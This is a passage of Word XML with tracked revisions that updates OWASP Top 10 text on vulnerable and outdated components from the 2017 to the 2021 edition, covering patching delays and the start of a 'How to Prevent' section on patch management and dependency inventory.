      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> security bulletins related to the components you use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B18B2B" w14:textId="0C35CAFD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2287" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2288" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="64349688" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2289" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2290" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> If you do not fix or upgrade the underlying platform, frameworks,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507FDC29" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2291" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2292" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and dependencies in a risk-based, timely fashion. This commonly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="542DFB4B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2293" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2294" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> happens in environments when patching is a monthly or quarterly task</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030E4364" w14:textId="00F3D89C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2295" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2296" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> under change control, </w:t>
      </w:r>
      <w:del w:id="2297" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>which leaves</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2298" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>leaving</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> organizations open to </w:t>
      </w:r>
      <w:del w:id="2299" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">many </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>days or months</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553C1052" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2300" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of unnecessary exposure to fixed vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4AEE15" w14:textId="25C97C6A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2301" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2302" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="619C99BB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2303" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2304" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> If software developers do not test the compatibility of updated,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC28FBF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2305" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> upgraded, or patched libraries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7611730B" w14:textId="3DB6BAA3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2306" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2307" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="167752FA" w14:textId="210C19F3" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2308" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2309" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> If you do not secure the </w:t>
      </w:r>
      <w:del w:id="2310" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>components'</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2311" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>components’</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> configurations (see</w:t>
      </w:r>
      <w:del w:id="2312" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> **A6:2017</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7AB6FC89" w14:textId="684C4662" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2313" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    [A05:2021</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-Security Misconfiguration</w:t>
      </w:r>
      <w:del w:id="2314" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**).</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2315" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>](A05_2021-Security_Misconfiguration.md)).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="59030B0E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64CBF884" w14:textId="513505E7" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">## How </w:t>
      </w:r>
      <w:del w:id="2316" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>To</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2317" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Prevent</w:t>
      </w:r>
      <w:ins w:id="2318" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0009D765" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1498DF56" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>There should be a patch management process in place to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47BCAF13" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C954251" w14:textId="7A3042C2" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2319" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2320" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2321" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Remove unused dependencies, unnecessary features, components, files,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751DD997" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2322" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and documentation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15317097" w14:textId="287E167F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2323" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2324" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="24B918B7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2325" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2326" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Continuously inventory the versions of both client-side and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF5DF5F" w14:textId="0831D018" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2327" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2328" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> server-side components (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="2329" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2330" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> frameworks, libraries) and their</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528736DF" w14:textId="7A08E6E8" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2331" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2332" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> dependencies using tools like versions, </w:t>
      </w:r>
      <w:del w:id="2333" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>DependencyCheck,</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2334" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>OWASP Dependency Check,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="428F4958" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2335" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2336" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
